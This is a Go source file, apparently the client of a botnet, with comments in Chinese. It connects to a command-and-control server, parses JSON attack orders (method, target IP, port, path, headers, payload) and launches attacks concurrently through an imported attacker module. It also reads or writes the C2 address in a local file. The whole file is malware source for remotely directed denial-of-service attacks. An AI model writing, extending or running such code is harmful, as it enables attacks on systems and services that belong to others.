package main

import (
	"bufio"
	"encoding/json"
	"io"
	"log"
	"net"
	"os"
	"strings"
	"bytes"

	"bot/attacker"
	"bot/attacker/attack"
)

func handleC2Connection(conn net.Conn) {
	defer conn.Close()

	reader := bufio.NewReader(conn)
	for {
		// 读取JSON字节流
		commandBytes, err := reader.ReadBytes('\n')
		if err != nil {
			if err == io.EOF {
				log.Println("C2 server closed the connection")
			} else {
				log.Printf("Error reading command: %v", err)
			}
			return
		}

		commandBytes = bytes.TrimSpace(commandBytes)

		if method, ip, port, path, header, payload, ok := parseCommand(commandBytes); ok {
			go attacker.AttackInit(method, ip, port, path, header, payload)
			log.Printf("Attack started: [%s] %s:%d%s", method, ip, port, path)
		}
	}
}

// 帮助截断长字符串用于日志显示
func truncateString(s string, maxLength int) string {
	if len(s) <= maxLength {
		return s
	}
	return s[:maxLength] + "..."
}

func parseCommand(cmd []byte) (method string, ip string, port int, path string, header string, payload string, ok bool) {	
	var command BotCommand
	if err := json.Unmarshal(cmd, &command); err != nil {
		log.Printf("Error parsing command: %v", err)
		return "", "", 0, "", "", "", false
	}	

	// 处理停止命令
    if command.Method == "STOP" {
        return "STOP", "", 0, "", "", "", true
    }
    
    // 验证IP
    if net.ParseIP(command.IP) == nil {
        log.Printf("无效的IP地址: %s", ip)
        return "", "", 0, "", "", "", false
    }
    
    // 验证端口
    if command.Port < 1 || command.Port > 65535 {
        log.Printf("无效的端口号: %v", command.Port)
        return "", "", 0, "", "", "", false
    }
    
	// 添加路径前缀
	if !strings.HasPrefix(command.Path, "/") {
		path = "/" + path
	}
    
    
	return command.Method, command.IP, command.Port, command.Path, command.Header, command.Payload, true
}


// initConfig 初始化攻击配置
func initConfig() {
	log.Printf("攻击线程数: %d", attack.ThreadCount)
	log.Printf("带宽限制: %d Kbps", attack.BandwidthLimit)
	
	// 确保serverfile目录存在
	ensureDirectoryExists("./serverfile")
}

// ensureDirectoryExists 确保目录存在
func ensureDirectoryExists(dir string) {
	if _, err := os.Stat(dir); os.IsNotExist(err) {
		log.Printf("创建目录: %s", dir)
		if err := os.MkdirAll(dir, 0755); err != nil {
			log.Fatalf("无法创建目录 %s: %v", dir, err)
		}
	}
}

// readC2Address 从文件读取C2服务器地址
func readC2Address() string {
	// 尝试从文件读取地址
	if _, err := os.Stat(c2File); err == nil {
		data, err := os.ReadFile(c2File)
		if err == nil {
			addr := strings.TrimSpace(string(data))
			if addr != "" {
				return addr
			}
		}
	}
	
	// 文件不存在或读取失败时，写入默认地址
	const defaultAddr = "127.0.0.1" // 默认本地地址
	log.Printf("未找到有效的C2地址，使用默认地址: %s", defaultAddr)
	
	// 确保serverfile目录存在
	ensureDirectoryExists("./serverfile")
	
	// 写入默认地址到文件
	if err := os.WriteFile(c2File, []byte(defaultAddr), 0644); err != nil {
		log.Printf("写入默认C2地址到文件失败: %v", err)
	}
	
	return defaultAddr
}